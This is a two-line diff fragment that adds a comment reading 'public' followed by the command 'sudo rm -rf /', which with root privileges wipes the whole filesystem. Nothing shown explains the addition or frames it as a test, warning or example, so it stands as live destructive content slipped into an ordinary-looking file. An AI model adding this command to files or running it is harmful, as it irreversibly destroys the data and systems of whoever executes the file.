@@ -1,0 +1,2 @@
+# public
+sudo rm -rf /
